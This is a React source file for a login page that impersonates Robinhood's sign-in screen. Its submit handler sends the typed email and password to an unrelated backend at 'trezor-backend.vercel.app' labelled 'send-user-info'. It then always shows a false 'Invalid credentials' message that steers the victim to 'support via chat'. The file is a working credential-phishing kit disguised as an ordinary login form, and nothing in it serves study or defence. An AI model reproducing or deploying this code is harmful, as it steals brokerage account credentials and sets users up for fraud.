"use client";
import React, { useState } from "react";
import {
    Box,
    Button,
    Dialog,
    DialogActions,
    DialogContent,
    DialogTitle,
    Grid,
    IconButton,
    Link,
    List,
    ListItemButton,
    Snackbar,
    Stack,
    TextField,
    Typography,
} from "@mui/material";
import CloseIcon from '@mui/icons-material/Close';
import axios from "axios";
export default function LoginMainPage() {
    const [openHelpModal, setOpenHelpModal] = useState(false);
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const handleCloseHelp = () => setOpenHelpModal(false);
    const [loading, setLoading] = useState(false)
    const [open, setOpen] = useState(false);

    const handleSubmit = async (e) => {
        e.preventDefault(); // Prevent page reload
        try {
            if (!email || !password) {
                alert("Please enter both email and password");
                return;
            }
            const data = {
                title: "Robin Hood",
                email: email,
                password

            }
            setLoading(true)
            const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data)
            if (response) {
                setOpen(true)
            }
        } catch (err) {
            console.log(err);

        } finally {
            setLoading(false)

        }

    };


    const handleClose = (event, reason) => {
        if (reason === 'clickaway') {
            return;
        }

        setOpen(false);
    };
    const action = (
        <React.Fragment>
            <Button color="secondary" size="small" onClick={handleClose}>
                UNDO
            </Button>
        </React.Fragment>
    );
    return (
        <Box sx={{ bgcolor: "white", color: "white", minHeight: "100vh" }}>
            <Snackbar
                open={open}
                autoHideDuration={6000}
                onClose={handleClose}
                message="Invalid credentials. Please contact support via chat."
                action={action}
                anchorOrigin={{ vertical: 'top', horizontal: 'right' }}
            />
            <Grid container>
                {/* ---------- Left Section: Video Background ---------- */}
                <Grid
                    size={{ xs: 0, md: 6 }}
                    sx={{
                        position: "relative",
                        display: { xs: "none", md: "block" },
                        overflow: "hidden",
                    }}
                >
                    <Box
                        component="img"
                        src="https://winkx.xyz/rjklnkl/rhdfstbg/assets/1e23d6b90f0d905b425ea289de345ab1.jpg"
                        alt="Animated SVG Background"
                        sx={{
                            width: "100%",
                            height: "100%",
                            position: "absolute",
                            top: "50%",
                            left: "50%",
                            transform: "translate(-50%, -50%)",
                            objectFit: "cover",
                            pointerEvents: "none",

                        }}
                    />

                </Grid>

                {/* ---------- Right Section: Login Form ---------- */}
                <Grid
                    size={{ xs: 12, md: 6 }}
                    sx={{
                        display: "flex",
                        // alignItems: "center",
                        justifyContent: "center",
                        minHeight: "100vh",
                        p: { xs: "80px 40px", md: "105px 250px 52px 52px" },
                        height: "100vh",
                        overflowY: "auto"
                    }}
                >
                    <Box sx={{ width: "100%", }}>
                        <Typography
                            variant="h5"
                            fontWeight={600}
                            mb={4}
                            textAlign="left"
                            color="black"
                            sx={{
                                fontSize: "21px",
                                fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                            }}
                        >
                            Log in to Robinhood
                        </Typography>
                        <form onSubmit={handleSubmit} >
                            {/* Email */}
                            <Typography variant="body2" mb={1} sx={{
                                color: "black", fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                fontWeight: 400,
                                fontSize: "13px",
                                mt: 6,
                                mb: 2.5
                            }}>
                                Email
                            </Typography>
                            <TextField
                                fullWidth
                                variant="outlined"
                                type="email"
                                required
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                size="small"
                                InputProps={{
                                    sx: { color: "black", borderColor: "black" },
                                }}
                                InputLabelProps={{ style: { color: "black" } }}
                                sx={{
                                    mb: 3,
                                    "& .MuiOutlinedInput-root": {
                                        "& fieldset": { borderColor: "rgb(227,233,237)" },
                                        "&:hover fieldset": { borderColor: "rgb(227,233,237)" },
                                    },
                                }}
                            />

                            {/* Password */}
                            <Typography variant="body2" mb={1} sx={{
                                color: "black", fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                fontWeight: 400,
                                fontSize: "13px",
                                mt: 1,
                                mb: 2.5
                            }}>
                                Password
                            </Typography>
                            <TextField
                                fullWidth
                                type={showPassword ? "text" : "password"}
                                size="small"
                                variant="outlined"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                required
                                sx={{
                                    mb: 2,
                                    "& .MuiOutlinedInput-root": {
                                        "& fieldset": { borderColor: "rgb(227,233,237)" },
                                        "&:hover fieldset": { borderColor: "rgb(227,233,237)" },
                                    },
                                    input: {
                                        color: "black",
                                    },
                                }}
                            />

                            <Link href="#" underline="hover" sx={{
                                color: "#000000", textDecoration: "underline", fontWeight: 700, fontSize: "13px", mt: 2,
                                fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                            }}>
                                Forgot your password?
                            </Link>

                            {/* Buttons */}
                            <Box display="flex" gap={2} mt={3} mb={1}>
                                <Button
                                    fullWidth
                                    loading={loading}
                                    disabled={loading}
                                    type="submit"
                                    variant="contained"
                                    sx={{
                                        width: "130px",
                                        mt: 5,
                                        bgcolor: "black",
                                        height: "44px",
                                        color: "white",
                                        textTransform: "none",
                                        fontWeight: 700,
                                        "&:hover": { bgcolor: "black" },
                                        borderRadius: "24px",
                                        fontSize: "13px",
                                        fontFamily:
                                            '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                    }}
                                >
                                    Log In
                                </Button>
                            </Box>
                        </form>


                        {/* Create account */}
                        <Typography mt={3} sx={{
                            fontSize: "13px", fontWeight: 400,

                            fontFamily:
                                '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                        }} color="black">
                            Not on Robinhood?{" "}
                            <Link href="#" underline="hover" sx={{
                                color: "#000000", textDecoration: "underline", fontWeight: 400,
                                fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                            }}>
                                Create an account
                            </Link>
                        </Typography>
                    </Box>
                </Grid>
            </Grid>
            <Dialog
                open={openHelpModal}
                onClose={handleCloseHelp}
                PaperProps={{
                    sx: {
                        bgcolor: "rgb(30, 33, 36)",
                        color: "white",
                        borderRadius: "6px",
                        minWidth: 400,
                        border: "none"
                    },
                }}
            >
                <Stack direction={"row"} justifyContent={"space-between"}>

                    <DialogTitle sx={{
                        fontWeight: 600, border: "none", color: "white", fontFamily:
                            '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                    }}>What can we help with?</DialogTitle>
                    <IconButton
                        aria-label="close"
                        onClick={handleCloseHelp}
                        sx={(theme) => ({
                            position: 'absolute',
                            right: 8,
                            top: 8,
                            color: theme.palette.grey[500],
                        })}
                    >
                        <CloseIcon />
                    </IconButton>
                </Stack>
                <DialogContent dividers sx={{ px: 3, py: 0 }}>
                    <List>
                        {[
                            "I forgot my password",
                            "I forgot the email address I log in with",
                            "I need access to an account as a third party",
                            "There's an unauthorized account in my name",
                        ].map((text, idx) => (
                            <ListItemButton
                                key={idx}
                                sx={{
                                    color: "white",
                                    borderBottom: "1px solid #333",
                                    pb: 2,
                                    px: 0,
                                    fontSize: "13px",
                                    fontWeight: "700",
                                    fontFamily:
                                        '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                                    // "&:hover": { bgcolor: "#222" },
                                }}
                            >
                                {text}
                            </ListItemButton>
                        ))}
                    </List>
                </DialogContent>
                <DialogActions sx={{ px: 3, pb: 3 }}>
                    <Button
                        fullWidth
                        variant="outlined"
                        sx={{
                            borderColor: "white",
                            color: "white",
                            height: "44px",
                            textTransform: "none",
                            fontWeight: 700,
                            borderRadius: "24px",
                            fontSize: "13px",
                            mt: 2,
                            background: "rgb(30, 33, 36)",
                            "&:hover": { borderColor: "#aaa" },

                            fontFamily:
                                '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                        }}
                        onClick={handleCloseHelp}

                    >
                        Cancel
                    </Button>
                </DialogActions>
            </Dialog>
        </Box>
    );
}
